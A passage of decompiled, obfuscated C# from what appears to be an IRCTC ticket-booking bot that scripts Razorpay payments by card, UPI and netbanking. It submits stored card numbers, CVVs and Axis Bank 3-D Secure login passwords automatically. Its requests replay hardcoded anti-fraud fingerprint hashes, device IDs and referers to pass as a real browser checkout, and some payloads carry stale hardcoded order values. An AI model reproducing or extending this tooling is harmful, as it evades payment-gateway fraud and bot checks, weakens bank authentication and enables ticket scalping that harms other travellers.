                    string text10 = response.Substring(response.IndexOf("key") + 7);
                    string text11 = text10.Substring(0, text10.IndexOf("\""));
                    text10 = text10.Substring(text10.IndexOf("merchant_order_id") + 21);
                    string text12 = text10.Substring(0, text10.IndexOf("\""));
                    text10 = text10.Substring(text10.IndexOf("txn_date") + 12);
                    string text13 = text10.Substring(0, text10.IndexOf("\""));
                    text10 = text10.Substring(text10.IndexOf("amount") + 10);
                    string text14 = text10.Substring(0, text10.IndexOf("\""));
                    text10 = text10.Substring(text10.IndexOf("url_order_id") + 16);
                    text10.Substring(0, text10.IndexOf("\""));
                    text10 = text10.Substring(text10.IndexOf("callback") + 12);
                    string text15 = text10.Substring(0, text10.IndexOf("\""));
                    text15 = text15.Replace("\\", "");
                    text10 = text10.Substring(text10.IndexOf("amount") + 9);
                    string text16 = text10.Substring(0, text10.IndexOf(","));
                    text10 = text10.Substring(text10.IndexOf("checkSum") + 12);
                    text10.Substring(0, text10.IndexOf("\""));
                    text10 = text10.Substring(text10.IndexOf("order_id") + 12);
                    string text17 = text10.Substring(0, text10.IndexOf("\""));
                    url = "https://api.razorpay.com/v1/preferences?key_id=" + text11 + "&order_id=" + text17 + "&checkcookie=1";
                    postdata = "";
                    if (updateTStatus_1 != null)
                    {
                        updateTStatus_1.BeginInvoke(1, "Init. " + text8 + "(2/6)", tCntrlName_, null, null);
                    }
                    if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                    {
                        clsMain.Lock("Getting payment out error= " + response);
                        result = false;
                    }
                    else
                    {
                        url = "https://api.razorpay.com/v1/payments/create/fees";
                        if (text8 == "DC")
                        {
                            postdata = "method=card&card%5Bnumber%5D=" + text2 + "&card%5Bname%5D=" + text6 + "&card%5Bcvv%5D=" + text5 + "&amount=" + text16 + "&view=html&currency=INR&order_id=" + text17 + "&key_id=" + text11 + "&_%5Bshield%5D%5Bfhash%5D=f1da855d07ac1aee75f12e284a888b0370ddcf83&_%5Bshield%5D%5Btz%5D=" + text12 + "&notes%5Breservation_id%5D=" + text12 + "&notes%5Bapp_code%5D=BOOKING&notes%5Bpayment_mode%5D=Internet&notes%5Btxn_date%5D=" + text13 + "&notes%5Bsecurity_id%5D=CRIS&notes%5Bamount%5D=" + text14 + "&notes%5Bmerchant_order_id%5D=" + text12 + "&card%5Bexpiry_month%5D=" + text3 + "&card%5Bexpiry_year%5D=" + text4 + "&_%5Bcheckout_id%5D=BzkkZ3IBFIB0PX&_%5Breferer%5D=https%3A%2F%2Fcheckout.razorpay.com%2Forders%2Forder_BzkkYyNal7Db9M%3Fx_ranid%3DBzkkYseQIsW1sf&_%5Blibrary%5D=checkoutjs&_%5Bplatform%5D=browser&callback_url=" + HttpUtility.UrlEncode(text15);
                        }
                        else if (text8 == "BHIMUPI")
                        {
                            postdata = "method=upi&_%5Bflow%5D=directpay&vpa=" + HttpUtility.UrlEncode(text2) + "&amount=" + text16 + "&view=html&currency=INR&order_id=" + text17 + "&key_id=" + text11 + "&_%5Bshield%5D%5Bfhash%5D=cd10d6a33460cc85a7bedbd0cb5f887546475d06&_%5Bshield%5D%5Btz%5D=330&notes%5Breservation_id%5D=" + text12 + "&notes%5Bapp_code%5D=BOOKING&notes%5Bpayment_mode%5D=Internet&notes%5Btxn_date%5D=" + text13 + "&notes%5Bsecurity_id%5D=CRIS&notes%5Bamount%5D=" + text14 + "&notes%5Bmerchant_order_id%5D=" + text12 + "&_%5Bcheckout_id%5D=BEzZfZPklUBiYE&_%5Breferer%5D=https%3A%2F%2Fcheckout.razorpay.com%2Forders%2Forder_BEzZfPTiq65obJ%3Fx_ranid%3DBEzZfJGYnfWKPv&_%5Blibrary%5D=checkoutjs&_%5Bplatform%5D=browser&callback_url=" + HttpUtility.UrlEncode(text15);
                        }
                        else
                        {
                            postdata = "method=net&_%5Bflow%5D=directpay&vpa=" + HttpUtility.UrlEncode(text2) + "&amount=" + text16 + "&view=html&currency=INR&order_id=" + text17 + "&key_id=" + text11 + "&_%5Bshield%5D%5Bfhash%5D=cd10d6a33460cc85a7bedbd0cb5f887546475d06&_%5Bshield%5D%5Btz%5D=330&notes%5Breservation_id%5D=" + text12 + "&notes%5Bapp_code%5D=BOOKING&notes%5Bpayment_mode%5D=Internet&notes%5Btxn_date%5D=" + text13 + "&notes%5Bsecurity_id%5D=CRIS&notes%5Bamount%5D=" + text14 + "&notes%5Bmerchant_order_id%5D=" + text12 + "&_%5Bcheckout_id%5D=BEzZfZPklUBiYE&_%5Breferer%5D=https%3A%2F%2Fcheckout.razorpay.com%2Forders%2Forder_BEzZfPTiq65obJ%3Fx_ranid%3DBEzZfJGYnfWKPv&_%5Blibrary%5D=checkoutjs&_%5Bplatform%5D=browser&callback_url=" + HttpUtility.UrlEncode(text15);
                        }
                        if (updateTStatus_1 != null)
                        {
                            updateTStatus_1.BeginInvoke(1, "Init. " + text8 + "(3/6)", tCntrlName_, null, null);
                        }
                        if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                        {
                            clsMain.Lock("Getting payment out error= " + response);
                            result = false;
                        }
                        else
                        {
                            if (updateTStatus_1 != null)
                            {
                                updateTStatus_1.BeginInvoke(1, "Init. " + text8 + "(4/6)", tCntrlName_, null, null);
                            }
                            url = "https://api.razorpay.com/v1/payments/create/ajax";
                            if (text8 == "BHIMUPI")
                            {
                                postdata = "method=upi&vpa=" + HttpUtility.UrlEncode(text2) + "&_%5Bflow%5D=directpay&amount=" + text16 + "&fee=0&currency=INR&order_id=" + text17 + "&key_id=" + text11 + "&_%5Bshield%5D%5Bfhash%5D=189c1677fd0b882ce9b5cf96a475221b4900a7e0&_%5Bshield%5D%5Btz%5D=330&_%5Bbuild%5D=6712&notes%5Breservation_id%5D=100002228146689&notes%5Bapp_code%5D=BOOKING&notes%5Bpayment_mode%5D=Internet&notes%5Btxn_date%5D=20200109&notes%5Bsecurity_id%5D=CRIS&notes%5Bamount%5D=" + text14 + "&notes%5Bmerchant_order_id%5D=" + text12 + "&_%5Bcheckout_id%5D=E279MGqz9yiTA1&_%5Blibrary%5D=checkoutjs&_%5Bplatform%5D=browser&_%5Breferer%5D=" + HttpUtility.UrlEncode(text15);
                            }
                            else
                            {
                                string text18 = response.Substring(response.IndexOf("input"));
                                text18 = text18.Substring(text18.IndexOf("amount") + 15);
                                text18 = text18.Substring(0, text18.IndexOf("'"));
                                string text19 = response.Substring(response.IndexOf("notes"));
                                text19 = text19.Substring(text19.IndexOf("fee") + 12);
                                text19 = text19.Substring(0, text19.IndexOf("'"));
                                postdata = clsPostData.SetPost(postdata, "amount", text18);
                                postdata = clsPostData.SetPost(postdata, "fee", text19);
                            }
                            if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                            {
                                clsMain.Lock("Getting payment out error= " + response);
                                result = false;
                            }
                            else if (response.IndexOf("<input type=\"hidden\" name=\"error[code]\"") > 0)
                            {
                                string_91 = "Change Bank Getways";
                                File.AppendAllText(string_42, class3_0.string_39 + "|");
                                result = false;
                            }
                            else
                            {
                                if (text8 == "DC")
                                {
                                    bool flag2 = false;
                                    if (response.IndexOf("Merchant Check Out Page") > 0)
                                    {
                                        flag2 = true;
                                        postdata = class3_0.Method_SerialInp(response, ref url, false);
                                        if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                                        {
                                            clsMain.Lock("Getting payment out error= " + response);
                                            return false;
                                        }
                                    }
                                    bool flag3 = false;
                                    string text20 = text7;
                                    if (response.Contains("Federal"))
                                    {
                                        flag3 = method_179(ref response, text20, cookieContainer_1, errormsg, ref string_91);
                                    }
                                    else if (response.Contains("hdfcbank"))
                                    {
                                        flag3 = method_174(response, string_92, cookieContainer_1, text20, ref response, ref string_91);
                                    }
                                    else if (response.Contains("arcot"))
                                    {
                                        flag3 = method_178(ref response, string_92, cookieContainer_1, response, ref string_91);
                                    }
                                    else if (response.Contains("airtel"))
                                    {
                                        flag3 = method_175(ref response, text20, cookieContainer_1, errormsg, ref string_91);
                                    }
                                    if (flag3)
                                    {
                                        if (flag2)
                                        {
                                            postdata = class3_0.Method_SerialInp(response, ref url, false);
                                            if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                                            {
                                                clsMain.Lock("Getting payment out error= " + response);
                                                return false;
                                            }
                                            postdata = class3_0.Method_SerialInp(response, ref url, false);
                                            if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                                            {
                                                clsMain.Lock("Getting payment out error= " + response);
                                                return false;
                                            }
                                        }
                                        postdata = class3_0.Method_SerialInp(response, ref url, false);
                                        if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                                        {
                                            clsMain.Lock("Getting payment out error= " + response);
                                            return false;
                                        }
                                        postdata = class3_0.Method_SerialInp(response, ref url, false);
                                        if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                                        {
                                            clsMain.Lock("Getting payment out error= " + response);
                                            return false;
                                        }
                                    }
                                }
                                else if (text8 == "BHIMUPI")
                                {
                                    text10 = response.Substring(response.IndexOf("payment_id") + 13);
                                    string text21 = text10.Substring(0, text10.IndexOf("\""));
                                    url = "https://api.razorpay.com/v1/payments/" + text21 + "/status?key_id=" + text11;
                                    postdata = "";
                                    DateTime dateTime = DateTime.Now.AddSeconds(62.0);
                                    if (updateTStatus_1 != null)
                                    {
                                        updateTStatus_1.BeginInvoke(1, "Init. " + text8 + "(5/6)", tCntrlName_, null, null);
                                    }
                                    do
                                    {
                                        Application.DoEvents();
                                        Thread.Sleep(3000);
                                        if (DateTime.Now > dateTime)
                                        {
                                            break;
                                        }
                                        if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                                        {
                                            clsMain.Lock("Getting payment out error= " + response);
                                            return false;
                                        }
                                    }
                                    while (response.Contains("status"));
                                    if (response.Contains("status"))
                                    {
                                        clsMain.Lock("Getting payment out error= " + response);
                                        return false;
                                    }
                                    text10 = response.Substring(response.IndexOf("url") + 6);
                                    string text22 = text10.Substring(0, text10.IndexOf("\""));
                                    text22 = text22.Replace("\\", "");
                                    text10 = text10.Substring(text10.IndexOf("content") + 11);
                                    string text23 = text10.Substring(0, text10.IndexOf("}") - 1);
                                    text23 = text23.Replace("\":\"", "=").Replace("\",\"", "&");
                                    url = text22;
                                    postdata = text23;
                                    if (updateTStatus_1 != null)
                                    {
                                        updateTStatus_1.BeginInvoke(1, "Init. " + text8 + "(6/6)", tCntrlName_, null, null);
                                    }
                                    if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                                    {
                                        clsMain.Lock("Getting payment out error= " + response);
                                        return false;
                                    }
                                }
                                if (response.Contains("https://www.irctc.co.in/eticketing/"))
                                {
                                    string_91 = url;
                                    string_90 = response;
                                    result = true;
                                }
                                else
                                {
                                    result = flag;
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                clsMain.method_74("Process_RazorPay", ex.Message);
                result = false;
            }
            return result;
        }

        internal Image method_55(string string_86)
        {
            Image result = null;
            try
            {
                byte[] array = Convert.FromBase64String(string_86);
                using (MemoryStream stream = new MemoryStream(array, 0, array.Length))
                {
                    result = Image.FromStream(stream, true);
                    return result;
                }
            }
            catch
            {
                return result;
            }
        }

        private bool method_156(string string_86, string string_87, string string_88, string string_89, ref string string_90, ref string string_91, UpdateTStatus updateTStatus_2)
        {
            string_90 = "";
            string_91 = "";
            string_88 = string_88.ToUpper();
            class3_0.string_72 = "";
            clsMain.Lock("Enter ProcessCC_RAZ.  DETAILS: ");
            string_86.Contains("razorpay");
            bool result = false;
            string text = "Axis Debit";
            string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
            string text2 = array[0].Trim();
            string text3 = array[1];
            string text4 = array[2];
            text4 = text4.Substring(text4.Length - 2);
            string text5 = array[4];
            string str = array[6];
            string value = array[7];
            if (text3.Length < 2)
            {
                text3 = "0" + text3;
            }
            try
            {
                postdata = class3_0.Method_SerialInp(response, ref url, false);
                if (updateTStatus_1 != null)
                {
                    updateTStatus_1.BeginInvoke(1, "Init. " + text + "(1/6)", tCntrlName_, null, null);
                }
                string_52 = "Tls12";
                bool_30 = true;
                if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                dateTime_4 = DateTime.Now.AddMilliseconds(-60.0);
                stopwatch_0.Restart();
                string text6 = response.Substring(response.IndexOf("key") + 7);
                string text7 = text6.Substring(0, text6.IndexOf("\""));
                text6 = text6.Substring(text6.IndexOf("merchant_order_id") + 21);
                string text8 = text6.Substring(0, text6.IndexOf("\""));
                text6 = text6.Substring(text6.IndexOf("txn_date") + 12);
                string text9 = text6.Substring(0, text6.IndexOf("\""));
                text6 = text6.Substring(text6.IndexOf("amount") + 10);
                string text10 = text6.Substring(0, text6.IndexOf("\""));
                text10.Replace(".", "");
                text6 = text6.Substring(text6.IndexOf("url_order_id") + 16);
                text6.Substring(0, text6.IndexOf("\""));
                text6 = text6.Substring(text6.IndexOf("callback") + 12);
                text6.Substring(0, text6.IndexOf("\"")).Replace("\\", "");
                text6 = text6.Substring(text6.IndexOf("amount") + 9);
                string text11 = text6.Substring(0, text6.IndexOf(","));
                text6 = text6.Substring(text6.IndexOf("checkSum") + 12);
                text6.Substring(0, text6.IndexOf("\""));
                text6 = text6.Substring(text6.IndexOf("order_id") + 12);
                string text12 = text6.Substring(0, text6.IndexOf("\""));
                text6 = response.Substring(response.IndexOf("action") + 8);
                text6.Substring(0, text6.IndexOf("\""));
                string text13 = "callback\": \"";
                int length = text13.Length;
                text13 = response.Substring(response.IndexOf(text13) + length);
                string text14 = text13.Substring(0, text13.IndexOf("\""));
                text14 = text14.Replace("\\", "");
                text13 = "cancel\": \"";
                length = text13.Length;
                text13 = response.Substring(response.IndexOf(text13) + length);
                text13.Substring(0, text13.IndexOf("\"")).Replace("\\", "");
                url = "https://api.razorpay.com/v1/checkout/public";
                postdata = "";
                if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                url = "https://api.razorpay.com/v1/preferences?key_id=" + text7 + "&currency%5B0%5D=INR&order_id=" + text12 + "&amount=" + text11 + "&_%5Bbuild%5D=685528461&_%5Bcheckout_id%5D=GsumMRv2O0SFRC&_%5Blibrary%5D=hosted&_%5Bplatform%5D=browser&personalisation=1&checkcookie=1&_%5Brequest_index%5D=0";
                postdata = "";
                if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                url = "https://api.razorpay.com/v1/payments/create/fees";
                postdata = "method=card&card%5Bnumber%5D=" + text2 + "&card%5Bcvv%5D=" + text5 + "&card%5Bname%5D=" + HttpUtility.UrlEncode(str) + "&amount=" + text11 + "&currency=INR&order_id=" + text12 + "&key_id=" + text7 + "&_%5Bshield%5D%5Bfhash%5D=5da0ccf56a61a6e81276f615ba61ec44e4220074&_%5Bdevice_id%5D=1.5da0ccf56a61a6e81276f615ba61ec44e4220074.1616035709005.21978214&_%5Bshield%5D%5Btz%5D=330&_%5Bbuild%5D=685528461&notes%5Breservation_id%5D=" + text8 + "&notes%5Bapp_code%5D=BOOKING&notes%5Bpayment_mode%5D=Internet&notes%5Btxn_date%5D=" + text9 + "&notes%5Bsecurity_id%5D=CRIS&notes%5Bamount%5D=" + text10 + "&notes%5Bmerchant_order_id%5D=" + text8 + "&card%5Bexpiry_month%5D=" + text3 + "&card%5Bexpiry_year%5D=" + text4 + "&_%5Bcheckout_id%5D=GsumMRv2O0SFRC&_%5Blibrary%5D=hosted&_%5Bplatform%5D=browser&_%5Breferer%5D=https%3A%2F%2Fwww.irctc.co.in%2F";
                if (updateTStatus_1 != null)
                {
                    updateTStatus_1.BeginInvoke(1, "Init. " + text + "(3/6)", tCntrlName_, null, null);
                }
                if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                string text15 = "amount\":";
                length = text15.Length;
                text15 = response.Substring(response.IndexOf(text15) + length);
                text11 = text15.Substring(0, text15.IndexOf(","));
                text15 = "fee\":";
                length = text15.Length;
                text15 = response.Substring(response.IndexOf(text15) + length);
                string text16 = text15.Substring(0, text15.IndexOf("}"));
                url = "https://api.razorpay.com/v1/payments/create/ajax";
                postdata = "method=card&card%5Bnumber%5D=" + text2 + "&card%5Bcvv%5D=" + text5 + "&card%5Bname%5D=" + HttpUtility.UrlEncode(str) + "&amount=" + text11 + "&fee=" + text16 + "&currency=INR&order_id=" + text12 + "&key_id=" + text7 + "&_%5Bshield%5D%5Bfhash%5D=5da0ccf56a61a6e81276f615ba61ec44e4220074&_%5Bdevice_id%5D=1.5da0ccf56a61a6e81276f615ba61ec44e4220074.1616035709005.21978214&_%5Bshield%5D%5Btz%5D=330&_%5Bbuild%5D=685528461&notes%5Breservation_id%5D=" + text8 + "&notes%5Bapp_code%5D=BOOKING&notes%5Bpayment_mode%5D=Internet&notes%5Btxn_date%5D=" + text9 + "&notes%5Bsecurity_id%5D=CRIS&notes%5Bamount%5D=" + text10 + "&notes%5Bmerchant_order_id%5D=" + text8 + "&card%5Bexpiry_month%5D=" + text3 + "&card%5Bexpiry_year%5D=" + text4 + "&_%5Bcheckout_id%5D=GsumMRv2O0SFRC&_%5Blibrary%5D=hosted&_%5Bplatform%5D=browser&_%5Breferer%5D=https%3A%2F%2Fwww.irctc.co.in%2F&_%5Brequest_index%5D=0";
                if (updateTStatus_1 != null)
                {
                    updateTStatus_1.BeginInvoke(1, "Init. " + text + "(4/6)", tCntrlName_, null, null);
                }
                if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                string @string = GetString(response, "PaReq");
                @string = @string.Replace("\\", "");
                string string2 = GetString(response, "PaymentID");
                string string3 = GetString(response, "TermUrl");
                string3 = string3.Replace("\\", "");
                postdata = "MD=" + string2 + "&PaReq=" + HttpUtility.UrlEncode(@string) + "&PaymentID=" + string2 + "&TermUrl=" + HttpUtility.UrlEncode(string3);
                url = GetString(response, "url");
                url = url.Replace("\\", "");
                if (updateTStatus_1 != null)
                {
                    updateTStatus_1.BeginInvoke(1, "Init. " + text + "(4/6)", tCntrlName_, null, null);
                }
                if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                text15 = "name=\"cacheIdentifier\" value=\"";
                length = text15.Length;
                text15 = response.Substring(response.IndexOf(text15) + length);
                string text17 = text15.Substring(0, text15.IndexOf("\""));
                text15 = "XID\" value=\"";
                length = text15.Length;
                text15 = response.Substring(response.IndexOf(text15) + length);
                string str2 = text15.Substring(0, text15.IndexOf("\""));
                text15 = "NAME=\"txtLogin\" VALUE=\"";
                length = text15.Length;
                text15 = response.Substring(response.IndexOf(text15) + length);
                string text18 = text15.Substring(0, text15.IndexOf("\""));
                text15 = "document.frmPayerAuth.action =\t\"";
                length = text15.Length;
                text15 = response.Substring(response.IndexOf(text15) + length);
                url = "https://secure.axisbank.com" + text15.Substring(0, text15.IndexOf("\""));
                url = url.Replace("USER_AUTH&ADS_CANCEL=true&REASON=CANCEL&DELETE_CONTACT=true", "USER_AUTH&CANCEL=false&ISSUER_ID=%208111");
                postdata = "xdeviceId=&bTz=&bTzOS=&XID=" + HttpUtility.UrlEncode(str2) + "&txnAuthType=static&hash=&cacheIdentifier=" + text17 + "&txtLogin=" + text18 + "&txtPassword=" + WebUtility.UrlEncode(value) + "&otpValue=";
                if (updateTStatus_1 != null)
                {
                    updateTStatus_1.BeginInvoke(1, "Init. " + text + "(4/6)", tCntrlName_, null, null);
                }
                if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                if (response.Contains("Please do not use"))
                {
                    postdata = "";
                    Reffral = url;
                    url = text14;
                    text15 = "action=\"";
                    length = text15.Length;
                    text15 = response.Substring(response.IndexOf(text15) + length);
                    url = text15.Substring(0, text15.IndexOf("\""));
                    text15 = "name=\"MD\" value=\"";
                    length = text15.Length;
                    text15 = response.Substring(response.IndexOf(text15) + length);
                    string text19 = text15.Substring(0, text15.IndexOf("\""));
                    text15 = "name=\"PaRes\" value=\"";
                    length = text15.Length;
                    text15 = response.Substring(response.IndexOf(text15) + length);
                    string str3 = text15.Substring(0, text15.IndexOf("\""));
                    postdata = "MD=" + text19 + "&PaRes=" + HttpUtility.UrlEncode(str3);
                    if (updateTStatus_1 != null)
                    {
                        updateTStatus_1.BeginInvoke(1, "Init. " + text + "(6/6)", tCntrlName_, null, null);
                    }
                    if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                    {
                        clsMain.Lock("Getting payment out error= " + response);
                        return false;
                    }
                    if (response.Contains("razorpay_signature"))
                    {
                        postdata = "";
                        Reffral = url;
                        url = text14;
                        text15 = "razorpay_payment_id\":\"";
                        length = text15.Length;
                        text15 = response.Substring(response.IndexOf(text15) + length);
                        string text20 = text15.Substring(0, text15.IndexOf("\""));
                        text15 = "razorpay_order_id\":\"";
                        length = text15.Length;
                        text15 = response.Substring(response.IndexOf(text15) + length);
                        string text21 = text15.Substring(0, text15.IndexOf("\""));
                        text15 = "razorpay_signature\":\"";
                        length = text15.Length;
                        text15 = response.Substring(response.IndexOf(text15) + length);
                        string text22 = text15.Substring(0, text15.IndexOf("\""));
                        postdata = "razorpay_hosted_id=" + text21 + "&razorpay_payment_id=" + text20 + "&razorpay_order_id=" + text21 + "&razorpay_signature=" + text22;
                        if (updateTStatus_1 != null)
                        {
                            updateTStatus_1.BeginInvoke(1, "Init. " + text + "(6/6)", tCntrlName_, null, null);
                        }
                        if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                        {
                            clsMain.Lock("Getting payment out error= " + response);
                            return false;
                        }
                        if (response.Contains("https://www.irctc.co.in/eticketing/"))
                        {
                            string_91 = url;
                            string_90 = response;
                            return true;
                        }
                        return result;
                    }
                    return result;
                }
                return result;
            }
            catch (Exception ex)
            {
                clsMain.method_74("Process_RazorPay", ex.Message);
                return false;
            }
        }

        private bool method_157(string string_86, string string_87, string string_88, string string_89, ref string string_90, ref string string_91, UpdateTStatus updateTStatus_2)
        {
            string_90 = "";
            string_91 = "";
            string_88 = string_88.ToUpper();
            class3_0.string_72 = "";
            clsMain.Lock("Enter ProcessCC_RAZ.  DETAILS: ");
            string_86.Contains("razorpay");
            bool result = false;
            string text = "BHIM UPI";
            string str = string_87.Split(new string[1] { "||" }, StringSplitOptions.None)[0].Trim();
            try
            {
                string string_92 = GetString_(string_86, "encdata\",\"value", "\"");
                string string_93 = GetString_(string_86, "CHECKSUMHASH\",\"value", "\"");
                string string_94 = GetString_(string_86, "MID\",\"value", "\"");
                url = GetString_(string_86, "bankUrl\",\"value", "\"");
                postdata = "ENC_DATA=" + string_92 + "&CHECKSUMHASH=" + string_93 + "&MID=" + string_94;
                postdata = class3_0.Method_SerialInp(response, ref url, false);
                if (updateTStatus_1 != null)
                {
                    updateTStatus_1.BeginInvoke(1, "Init. " + text + "(1/6)", tCntrlName_, null, null);
                }
                string_52 = "Tls12";
                bool_30 = true;
                if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                //(text31s.IndexOf("method=\"post\""));
                dateTime_4 = DateTime.Now.AddMilliseconds(-60.0);
                stopwatch_0.Restart();
                string text2 = response.Substring(response.IndexOf("key") + 7);
                string text3 = text2.Substring(0, text2.IndexOf("\""));
                text2 = text2.Substring(text2.IndexOf("merchant_order_id") + 21);
                string text4 = text2.Substring(0, text2.IndexOf("\""));
                text2 = text2.Substring(text2.IndexOf("txn_date") + 12);
                string text5 = text2.Substring(0, text2.IndexOf("\""));
                text2 = text2.Substring(text2.IndexOf("amount") + 10);
                string text6 = text2.Substring(0, text2.IndexOf("\""));
                text6.Replace(".", "");
                text2 = text2.Substring(text2.IndexOf("url_order_id") + 16);
                text2.Substring(0, text2.IndexOf("\""));
                text2 = text2.Substring(text2.IndexOf("callback") + 12);
                text2.Substring(0, text2.IndexOf("\"")).Replace("\\", "");
                text2 = text2.Substring(text2.IndexOf("amount") + 9);
                string text7 = text2.Substring(0, text2.IndexOf(","));
                text2 = text2.Substring(text2.IndexOf("checkSum") + 12);
                text2.Substring(0, text2.IndexOf("\""));
                text2 = text2.Substring(text2.IndexOf("order_id") + 12);
                string text8 = text2.Substring(0, text2.IndexOf("\""));
                text2 = response.Substring(response.IndexOf("action") + 8);
                text2.Substring(0, text2.IndexOf("\""));
                string text9 = "callback\": \"";
                int length = text9.Length;
                text9 = response.Substring(response.IndexOf(text9) + length);
                string text10 = text9.Substring(0, text9.IndexOf("\""));
                text10 = text10.Replace("\\", "");
                text9 = "cancel\": \"";
                length = text9.Length;
                text9 = response.Substring(response.IndexOf(text9) + length);
                string text11 = text9.Substring(0, text9.IndexOf("\""));
                text11 = text11.Replace("\\", "");
                url = "https://api.razorpay.com/v1/payments/validate/account?key_id=" + text3;
                postdata = "entity=vpa&value=" + HttpUtility.UrlEncode(str);
                if (updateTStatus_1 != null)
                {
                    updateTStatus_1.BeginInvoke(1, "Init. " + text + "(2/6)", tCntrlName_, null, null);
                }
                if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                url = "https://api.razorpay.com/v1/checkout/public";
                postdata = "";
                if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                url = "https://api.razorpay.com/v1/preferences?key_id=" + text3 + "&currency%5B0%5D=INR&order_id=" + text8 + "&amount=" + text7 + "&_%5Bbuild%5D=685528461&_%5Bcheckout_id%5D=GsThl2GoueZgdX&_%5Blibrary%5D=hosted&_%5Bplatform%5D=browser&personalisation=1&checkcookie=1&_%5Brequest_index%5D=0";
                postdata = "";
                if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                url = "https://api.razorpay.com/v1/payments/create/fees";
                postdata = "method=upi&vpa=" + HttpUtility.UrlEncode(str) + "&save=0&upi%5Bflow%5D=collect&_%5Bflow%5D=directpay&amount=" + text7 + "&currency=INR&order_id=" + text8 + "&key_id=" + text3 + "&_%5Bshield%5D%5Bfhash%5D=5da0ccf56a61a6e81276f615ba61ec44e4220074&_%5Bdevice_id%5D=1.5da0ccf56a61a6e81276f615ba61ec44e4220074.1616035709005.21978214&_%5Bshield%5D%5Btz%5D=330&_%5Bbuild%5D=685528461&notes%5Breservation_id%5D=" + text4 + "&notes%5Bapp_code%5D=BOOKING&notes%5Bpayment_mode%5D=Internet&notes%5Btxn_date%5D=" + text5 + "&notes%5Bsecurity_id%5D=CRIS&notes%5Bamount%5D=" + text6 + "&notes%5Bmerchant_order_id%5D=" + text4 + "&_%5Bcheckout_id%5D=GsThl2GoueZgdX&_%5Blibrary%5D=hosted&_%5Bplatform%5D=browser&_%5Breferer%5D=https%3A%2F%2Fwww.irctc.co.in%2F";
                if (updateTStatus_1 != null)
                {
                    updateTStatus_1.BeginInvoke(1, "Init. " + text + "(3/6)", tCntrlName_, null, null);
                }
                if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                url = "https://api.razorpay.com/v1/payments/create/ajax";
